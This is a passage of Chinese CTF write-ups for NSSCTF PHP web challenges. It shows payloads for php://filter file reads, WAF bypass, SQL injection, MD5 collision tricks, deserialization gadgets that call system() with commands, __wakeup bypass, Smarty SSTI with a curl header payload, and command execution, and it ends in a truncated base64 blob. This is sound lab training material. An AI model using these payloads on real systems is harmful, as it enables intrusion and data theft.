前面我们通过`data://`伪协议满足了`$text`的验证，但`$file`参数需要包含`useless.php`（代码注释提示）。不过，我们并不知道`useless.php`里写了什么 —— 而后续的反序列化操作必须依赖这个文件中定义的类（比如类名、属性名、魔术方法等）。

如果直接用`file=useless.php`，`include`会执行该文件的 PHP 代码（不会显示源码），所以必须用 \*\*`php://filter`伪协议 \*\* 读取它的源码（以编码形式输出，避免被 PHP 解析）。

`php://filter` 伪协议之所以能读取 PHP 文件的源码，核心在于它能**在文件内容被 PHP 解析执行前，对其进行 “过滤处理”**，将源码以 “非执行” 的形式输出。

`php://filter/read=过滤器/resource=目标文件`

用这个playload看到

`file=php://filter/read=convert.base64-encode/resource=useless.php`

```
welcome to the zjctf

PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo=
```

解码后看到

![1761551378398](images/NSS/1761551378398.png)

这段代码是`useless.php`的核心内容，定义了一个名为`Flag`的类，它是我们实现反序列化攻击、读取`flag.php`的关键。我们逐行拆解其作用和在解题中的意义：

### 1. 类定义：`class Flag{ ... }`

定义了一个名为`Flag`的类（类名是后续反序列化的关键标识，必须准确匹配）。

### 2. 属性：`public $file;`

* 声明了一个**公共属性**`$file`（`public`意味着可以被外部直接访问和赋值）。
* 这个属性的作用是**存储要读取的文件名**（比如我们需要它指向`flag.php`）。

### 3. 魔术方法：`public function __tostring(){ ... }`

这是 PHP 中非常重要的**魔术方法**，作用是：当对象被当作字符串处理时（比如用`echo`输出对象），会自动调用该方法。

方法内部逻辑：

php

```php
if(isset($this->file)){  // 检查$file属性是否被设置（非空）
    echo file_get_contents($this->file);  // 读取$file对应的文件内容并输出
    echo "<br>";  // 输出换行
    return ("U R SO CLOSE !///COME ON PLZ");  // 返回一个字符串
}
```

* 核心功能：如果`$file`属性有值（比如设为`flag.php`），则通过`file_get_contents`读取该文件的内容并输出 —— 这正是我们获取 flag 的关键操作！
* 触发条件：当反序列化得到`Flag`对象后，代码执行`echo $password`（此时`$password`是`Flag`对象），会自动调用`__toString`方法。

先构造flag类的对象名且序列化

```php
<?php
// 必须先定义和useless.php中一致的Flag类（否则序列化会出错）
class Flag{
    public $file; // 和源码中的属性名一致
}

// 1. 实例化Flag对象
$obj = new Flag();

// 2. 设置$file属性为"flag.php"（要读取的目标文件）
$obj->file = "flag.php";

// 3. 序列化对象，得到可用于password参数的字符串
echo serialize($obj);
?>
```

然后用这个playload

```bash
?text=data://text/plain,welcome%20to%20the%20zjctf&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```

然后查看源码,发现flag

![1761551651162](images/NSS/1761551651162.png)

# 36.[鹏城杯 2022]简单包含

尝试查看flag.php

![1761556428268](images/NSS/1761556428268.png)

发现被墙了

用php://filter伪协议尝试

`php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php`

![1761557041738](images/NSS/1761557041738.png)

还是不行

尝试访问index.php看看具体的过滤规则

![1761557664589](images/NSS/1761557664589.png)

base64解码后得到

```php
<?php

$path = $_POST["flag"];

if (strlen(file_get_contents('php://input')) < 800 && preg_match('/flag/', $path)) {
    echo 'nssctf waf!';
} else {
    @include($path);
}
?>

<code><span style="color: #000000">
<span style="color: #0000BB"><?php <br />highlight_file</span><span style="color: #007700">(</span><span style="color: #0000BB">__FILE__</span><span style="color: #007700">);<br />include(</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">[</span><span style="color: #DD0000">"flag"</span><span style="color: #007700">]);<br /></span><span style="color: #FF8000">//flag in /var/www/html/flag.php;</span>
</span>
</code><br />

```

思路 1：让 POST 请求体长度 ≥ 800（最直接）

思路 2：让`$path`不包含 "flag"（适用于长度受限场景）

```php
a=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
&flag=php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php
```

用第一种,得到flag

PD9waHAgPSdOU1NDVEZ7YzQwNGJiMzYtMDEwNS00YTdhLTlhMGMtODQ4YjIxOWRiNDM1fSc7Cg==

![1761558309346](images/NSS/1761558309346.png)

![1761558355104](images/NSS/1761558355104.png)

## 🏗️ 典型网站目录结构

**text**

```
/var/www/html/              # Web根目录
├── index.php              # 主入口文件
├── flag.php              # 包含flag的文件
├── your_current_file.php  # 你正在访问的文件
└── 其他网页文件、CSS、JS等
```

## 📁 关键目录说明

### **Web相关目录**：

* `/var/www/html/` - **Web根目录**，Apache/Nginx默认从这里提供网页服务
* `/var/www/` - 通常包含所有网站项目
* `/etc/apache2/` 或 `/etc/nginx/` - Web服务器配置文件
* `/var/log/apache2/` 或 `/var/log/nginx/` - Web服务器日志

### **系统重要目录**：

* `/etc/passwd` - 用户账户信息（常用于测试文件读取）
* `/etc/hosts` - 主机名解析
* `/proc/` - 进程信息（可能包含有趣的内容）
* `/tmp/` - 临时文件目录
* `/home/` - 用户主目录

# 37.[SWPUCTF 2021 新生赛]sql

![1761558640073](images/NSS/1761558640073.png)

进入是这样的

查看源码发现参数是wllm

![1761558681219](images/NSS/1761558681219.png)

![1761559786937](images/NSS/1761559786937.png)

发现是字符型注入

![1761559868746](images/NSS/1761559868746.png)

报错了,被拦截了

![1761559970147](images/NSS/1761559970147.png)

还是报错

![1761561365016](images/NSS/1761561365016.png)

发现有3列

![1761561671900](images/NSS/1761561671900.png)

发现数据回显位是第二列和第三列

![1761561814567](images/NSS/1761561814567.png)

查到库名

![1761561875757](images/NSS/1761561875757.png)

查到表名

![1761561996311](images/NSS/1761561996311.png)

查到列名

![1761562064730](images/NSS/1761562064730.png)

查到一部分flag

![1761562728017](images/NSS/1761562728017.png)

又拿到一部分flag

![1761562827477](images/NSS/1761562827477.png)

得到最后一部分

完成NSSCTF{cae0af52-b007-4ee7-afe5-eb9116ad9732}

# 38.[NSSCTF 2022 Spring Recruit]babyphp

![1761655516742](images/NSS/1761655516742.png)

看到题目代码,阅读代码

`isset($_POST['a'])`：必须通过 POST 方式提交参数 `a`（即请求中必须包含 `a` 这个键）

`!preg_match('/[0-9]/', $_POST['a'])`：`preg_match` 是正则匹配函数，`/[0-9]/` 表示匹配任何数字（0-9）；`!` 表示 “不匹配”，即参数 `a` 的值中不能包含任何数字字符（0-9）。

`intval` 是将变量转换为整数的函数；在 PHP 中，“转换结果为非 0 值” 会被视为`true`，“0 或无法转换” 会被视为`false`。因此这里要求：`a` 转换为整数后必须是一个非 0 的有效整数。

`if(isset($_POST['a'])&&!preg_match('/[0-9]/',$_POST['a'])&&intval($_POST['a'])){`

* 这是一个条件判断，检查 POST 参数 `a` 是否满足三个条件：
  1. `isset($_POST['a'])`：参数 `a` 必须存在于 POST 请求中。
  2. `!preg_match('/[0-9]/',$_POST['a'])`：参数 `a` 的值不能包含任何数字（0-9）。这里有一个技巧：如果 `a` 是一个数组，`preg_match` 会返回 `false`（因为 `preg_match` 期望字符串），而 `!false` 是 `true`，所以条件满足。
  3. `intval($_POST['a'])`：将 `a` 转换为整数后，必须为非零值。如果 `a` 是一个非空数组，`intval` 会返回 1（非零），满足条件。
* 因此，为了通过这个检查，我们可以将 `a` 设置为一个非空数组，例如在 POST 数据中使用 `a[]=1`。

```bash
TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak
```

```bash'
TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak
```

这是两个不同的字符串,但是MD5相同为`faad49866e9498fc1719f5289e7a0269`

构造playload

```bash
a[]=1&b1=TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak&b2=TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak&c1=QNKCDZO&c2=s878926199a
```

得到flag

![1761657627731](images/NSS/1761657627731.png)

# 39.[鹤城杯 2021]EasyP

进入查看题目,读读代码发现过滤规则

![1761658215113](images/NSS/1761658215113.png)

#### 涉及的函数 / 变量解析：

1. **`preg_match`**：PHP 的正则匹配函数，用于检查字符串是否符合指定的正则表达式规则。语法：`preg_match(正则表达式, 目标字符串)`，返回`1`（匹配成功）或`0`（匹配失败）。
2. **正则表达式`/utils\.php\/*$/i`**：
   * `utils\.php`：匹配字符串`utils.php`（`.`是正则特殊字符，需用`\`转义为普通字符）；
   * `\/*`：匹配**0 个或多个斜杠`/`**（`*`表示前面的字符可出现 0 次或多次）；
   * `$`：匹配字符串的**结尾位置**（确保`utils.php`及后续的斜杠是路径的最后部分）；
   * `i`：修饰符，表示**不区分大小写**（例如`Utils.PHP`也会被匹配）。
3. **`$_SERVER['PHP_SELF']`**：PHP 的超全局变量，存储当前执行脚本的**路径信息**（从网站根目录开始的路径）。例如：
   * 访问`http://example.com/index.php`时，其值可能为`/index.php`；
   * 访问`http://example.com/index.php/abc/def`时，其值为`/index.php/abc/def`。

#### 涉及的函数 / 变量解析：

1. **`preg_match('/show_source/', ...)`**：检查目标字符串中是否包含`show_source`这个子串（不限制位置，只要出现就匹配）。
2. **`$_SERVER['REQUEST_URI']`**：PHP 超全局变量，存储当前请求的**完整 URL 路径 + 查询参数**（原始未解码的字符串）。例如：
   * 访问`http://example.com/index.php?a=1&b=2`时，其值为`/index.php?a=1&b=2`；
   * 访问`http://example.com/path?show_source=1`时，其值为`/path?show_source=1`。

#### 代码意图：

禁止 URL 中出现`show_source`这个字符串。目的是防止攻击者通过 URL 传递`show_source`相关的参数（比如`?show_source=1`）来触发源码展示逻辑（后续代码确实有基于`show_source`参数的源码展示）。

#### 涉及的函数 / 变量解析：

1. **`isset($_GET['show_source'])`**：
   * `isset`：PHP 函数，检查变量是否存在且不为`null`；
   * `$_GET['show_source']`：获取 URL 中`show_source`参数的值（例如`?show_source=1`中，该值为`1`）。
     这行代码的意思是：如果 URL 中存在`show_source`参数，则执行后续逻辑。
2. **`highlight_file`**：PHP 函数，用于**语法高亮显示指定文件的源代码**（常用于调试时展示代码）。例如`highlight_file('test.php')`会在页面上显示`test.php`的源码，并对语法关键字着色。
3. **`basename($_SERVER['PHP_SELF'])`**：
   * `basename`：PHP 函数，从路径中提取**文件名部分**（忽略路径中的目录层级）。例如：
     * `basename('/a/b/c.php')`返回`c.php`；
     * `basename('/index.php/abc')`返回`abc`（因为路径最后是`abc`）。
   * 结合`$_SERVER['PHP_SELF']`，这行的作用是：从当前脚本的路径中提取最后一段作为文件名。

#### 代码意图：

如果 URL 中存在`show_source`参数，则展示`basename($_SERVER['PHP_SELF'])`对应的文件的源码（语法高亮），然后终止脚本。

可以通过url编码绕过:(注意构造的恶意路径前面必须要加上index.php)

### 1. 先理解：服务器如何处理 URL 请求（为什么直接访问`/utils.php`会报错）

你遇到的 “Not Found”，是 Apache 服务器的正常响应 —— 当你访问`http://xxx/utils.php`时，服务器会去网站根目录找**名为`utils.php`的独立文件**，但这个文件很可能不存在（或服务器配置不允许直接访问）。因为`utils.php`是被当前脚本（比如`index.php`）通过`include 'utils.php'`调用的 “依赖文件”，它不是一个 “独立入口脚本”，服务器根目录里可能根本没有直接可访问的`utils.php`路径。

### 2. 加`index.php`的关键作用：让构造的路径被 PHP 解析，而非服务器当作文件查找

当我们在 URL 里加`index.php`（比如`/index.php/utils.php%00`）时，服务器会优先识别`index.php`—— 这是 Apache 默认的 “入口脚本名”（类似的还有`index.html`），服务器会直接执行`index.php`，而不会去查找`index.php/utils.php%00`这个 “不存在的文件”。

此时，`/utils.php%00`这个片段，会被当作`index.php`的 “路径后缀”，传递给 PHP 的`$_SERVER['PHP_SELF']`变量（比如`$_SERVER['PHP_SELF']`会变成`/index.php/utils.php%00`）。这正是我们需要的 —— 只有让`utils.php%00`进入`$_SERVER['PHP_SELF']`，才能利用后续的`basename()`函数漏洞（忽略`%00`），最终让`highlight_file`读取到`utils.php`的源码。

### 3. 总结：`index.php`是 “漏洞利用的桥梁”

没有`index.php`，我们构造的`/utils.php%00`会被服务器当作 “找文件”，直接报 404；加上`index.php`后，我们构造的路径会变成 “给`index.php`传的参数”，被 PHP 解析，进而触发代码里的`basename()`漏洞和`highlight_file`逻辑 —— 这才是能读取`utils.php`的前提。

![1761661751891](images/NSS/1761661751891.png)

playload:

```bash
/index.php/utils.php/%ff?%73how_source=1
或者
/index.php/utils.php/%ff?%73%68%6f%77%5f%73%6f%75%72%63%65=1
```

`%ff`的作用类似之前提到的`%00`（空字节），但更适合高版本 PHP 环境（`%00`在 PHP 5.3.4 + 中被禁用，而`%ff`等非 ASCII 字符的处理漏洞更普遍）

(注:满足了\$secret = "nssctfrtdfgvhbjdas";也没有意义,什么都不会出现)

# 40.[SWPUCTF 2022 新生赛]ez\_ez\_php(revenge)

![1761662433777](images/NSS/1761662433777.png)

`substr(\$\_GET["file"], 0, 3) === "php"`的意思是检查file参数的前三个值是不是严格等于php

想到使用php为协议,构造playload

```bash
?file=php://filter/read=convent.base64-encode/resource=flag.php
```

发现

![1761663044718](images/NSS/1761663044718.png)

尝试访问/flag得到flag

![1761663208734](images/NSS/1761663208734.png)

# 41.[SWPUCTF 2022 新生赛]1z\_unserialize

![1761721659174](images/NSS/1761721659174.png)

### 一、关于 `__destruct()` 析构方法的深度解释

析构方法是 PHP 面向对象中的 “生命周期钩子”，它的核心特点是**自动触发**，触发时机与对象的 “销毁” 强绑定。

1. **触发时机的具体场景**：

   * 最常见的情况：**脚本执行结束时**。PHP 脚本从开始到结束会创建各种对象，当整个脚本跑完（比如处理完一个 HTTP 请求后），所有未被手动销毁的对象会被 PHP 引擎自动清理，此时每个对象的`__destruct()`会被调用。
   * 手动销毁对象：比如用`unset($obj)`主动删除对象变量，或给对象变量赋新值（如`$obj = null`），此时对象失去引用，会被立即销毁，触发析构方法。
   * 垃圾回收：当对象没有任何变量引用它时（比如超出作用域），PHP 的垃圾回收机制会回收它，此时也会触发析构方法。
2. **`__destruct()` 内部逻辑的风险点**：这段代码的析构方法做了两件事：
   php

   ```php
   $a = $this->lt;  // 把当前对象的lt属性值传给$a
   $a($this->lly);  // 用$a作为函数，传入lly属性值作为参数执行
   ```

   这里的关键是 **`$a`被当作函数调用**。在 PHP 中，这种 “变量作为函数名” 的调用方式（称为 “可变函数”）是允许的，但要求`$a`必须是 “可调用的”（callable）。例如：

   * 如果`$a = 'system'`（系统函数名），那么`$a($this->lly)`就等价于`system($this->lly)`，会执行系统命令（参数是`lly`的值）。
   * 如果`$a = 'eval'`，则等价于`eval($this->lly)`，可以执行 PHP 代码（参数是`lly`的字符串）。
   * 甚至可以是匿名函数，比如`$a = function($x){echo $x;}`，此时会执行这个匿名函数。

### 二、`unserialize($_POST['nss'])` 的作用与风险

反序列化的核心是 “还原数据”，但在 PHP 中，它还原的可能是**对象**，而对象的行为由其类定义（包括析构方法）决定。

```php
<?php
class lyh{
    public $url = 'NSSCTF.com';  // 原始默认值，可不改
    public $lt;
    public $lly;
}

// 创建对象并赋值
$exp = new lyh();
$exp->lt = 'system';  // 函数名：执行系统命令的函数
$exp->lly = 'ls';     // 命令：列出当前目录文件（可替换为其他命令，如 'whoami'、'phpinfo()' 等）

// 生成序列化字符串
echo serialize($exp);
?>
```

```
`O:3:"lyh":3:{s:3:"url";s:10:"NSSCTF.com";s:2:"lt";s:6:"system";s:3:"lly";s:2:"ls";}`
```

![1761722909347](images/NSS/1761722909347.png)

发现flag不在当前目录,在/根目录下,用cat查看

![1761722997419](images/NSS/1761722997419.png)

# 42.[CISCN 2019华东南]Web11

进入题目环境,看到

![1762157132051](images/NSS/1762157132051.png)

**目明确标注 “Build With Smarty !”**
Smarty 是 PHP 生态中常用的模板引擎，而模板引擎的核心机制是 “将用户输入 / 变量嵌入模板，再渲染成 HTML”—— 如果模板渲染时没有过滤用户输入的 “模板语法”（比如 Smarty 的`{ }`），就会触发 SSTI。
看到 “Build With XXX（模板引擎名，如 Smarty、Twig、Jinja2）”，直接优先怀疑 SSTI。

传了{4*4}发现返回16,确定时ssti

![1762156817639](images/NSS/1762156817639.png)

既可以通过bp来做这道题,也可以通过curl来做

![1762156865991](images/NSS/1762156865991.png)

![1762157002343](images/NSS/1762157002343.png)

### 用 curl 时需要注意什么？（核心规避 “Shell 字符解析” 问题）

curl 在 Linux/macOS 的 Shell 环境中，会遇到 “特殊字符被 Shell 提前处理” 的坑，必须注意 3 点：

#### 1. 用 “单引号” 包裹 Payload，阻止 Shell 解析模板语法

Smarty 的 SSTI 依赖`{ }` `$`等特殊字符，而 Shell 会把这些字符当作 “自身语法”（如`{ }`是大括号扩展、`$`是变量引用），导致 Payload 被篡改。

* **正确做法**：把包含`{ }`的请求头值用单引号`''`包裹，比如：
  `curl -H 'X-Forwarded-For: {system("ls")}' 目标URL`
* **错误做法**：用双引号`""`（Shell 仍会解析`$`）或不引号（`{ }`会被 Shell 处理为空）。

![1761725418986](images/NSS/1761725418986.png)

首先要明确核心前提：**一个位置能成为 SSTI 注入点，必须同时满足 3 个条件**：

1. 「用户能控制输入」：你能随便改这个位置的内容（比如改 IP、改字符串）；
2. 「输入能进入模板渲染流程」：服务器会把你输入的内容，放进模板引擎（这里是 Smarty）里处理；
3. 「模板引擎不过滤特殊语法」：Smarty 不会把你输入的`{ }`（模板语法）当成普通字符串，而是会解析执行。

# 43.[SWPUCTF 2022 新生赛]ez\_ez\_unserialize

看到题目

![1762324602394](images/NSS/1762324602394.png)

我们阅读代码首先有一个类X,

类X里面有一个公共属性$x,默认的值是当前的文件路径(_FILE_是php的魔术常量)

构造函数:

```php
    function __construct($x)
    {
        $this->x = $x;  // 实例化对象时，用传入的参数$x覆盖默认的$x属性
    }
```

* 作用：创建`X`类对象时，强制将传入的参数赋值给`$x`（覆盖默认的当前文件路径）。

```php
    function __wakeup()
    {
        if ($this->x !== __FILE__) {  // 检查$x是否等于当前文件路径
            $this->x = __FILE__;      // 不等则强制改回当前文件路径
        }
    }
```

* 关键逻辑：**反序列化时会自动执行**，目的是阻止`$x`被修改为其他文件路径（保护当前文件不被篡改显示）。

```php
    function __destruct()
    {
        highlight_file($this->x);  // 语法高亮显示$x指向的文件内容
        //flag is in fllllllag.php  // 提示：flag在fllllllag.php中
    }
```

* 关键逻辑：**对象被销毁时自动执行**，核心目标是让`highlight_file()`显示`fllllllag.php`的内容（从而拿到 flag）。

```php
if (isset($_REQUEST['x'])) {  // 检查是否传入参数x（支持GET/POST/COOKIE）
    @unserialize($_REQUEST['x']);  // 对参数x进行反序列化（@抑制错误）
} else {
    highlight_file(__FILE__);  // 未传参则显示当前文件代码
}
//在 PHP 中，$_REQUEST 是一个 超全局变量（无需声明即可在脚本任何位置使用），核心作用是 接收客户端（浏览器）传递给服务器的参数，且会自动整合三种常见传参方式的数据。
```

要显示`fllllllag.php`，必须让`$x = "fllllllag.php"`，但`__wakeup()`会强制改回当前文件路径。因此，**必须绕过\_\_wakeup () 的执行**。

### 重点:当序列化字符串中**表示对象属性个数的数字 > 实际属性个数**时，`__wakeup()`会被跳过（PHP 认为对象被篡改，放弃执行唤醒函数）。

### 类 X 只有 1 个公共属性`$x`，因此**实际属性个数 = 1**。我们只需修改序列化字符串中的 “属性个数” 为大于 1 的数（如 2），即可绕过`__wakeup()`。


```php
<?php
// 先复制题目中的 X 类（必须和题目类结构完全一致，否则序列化结果无效）
class X
{
    public $x = __FILE__;
    function __construct($x)
    {
        $this->x = $x;
    }
    function __wakeup()
    {
        if ($this->x !== __FILE__) {
            $this->x = __FILE__;
        }
    }
    function __destruct()
    {
        highlight_file($this->x);
    }
}

// 1. 创建 X 类对象，传入目标文件路径 "fllllllag.php"
$obj = new X("fllllllag.php");

// 2. 序列化这个对象，并用 echo 输出结果
echo serialize($obj);
?>
```

把原始字符串中的 “属性个数” 从 `1` 改成 **大于 1 的任意数字**（比如 2、3、4 都可以，最常用的是 2）。

```php
O:1:"X":1:{s:1:"x";s:13:"fllllllag.php";}
```

```php
O:1:"X":1:{s:1:"x";s:13:"fllllllag.php";}
          ↓
修改后（属性个数改成 2）：
O:1:"X":2:{s:1:"x";s:13:"fllllllag.php";}
```

![1762326122257](images/NSS/1762326122257.png)

得到flag


# 44.[羊城杯 2020]easycon

打开题目发现是这样的,尝试访问index.php

![1762326660189](images/NSS/1762326660189.png)

看到提示,提示可以通过post执行命令

![1762326781130](images/NSS/1762326781130.png)

看到有一个可疑文件bbbbbbbbb.txt

(注意提交post的时候cmd=system('ls');后面要加上;别忘了)

![1762327713949](images/NSS/1762327713949.png)

看到一串字符

![1762327835871](images/NSS/1762327835871.png)

```base64
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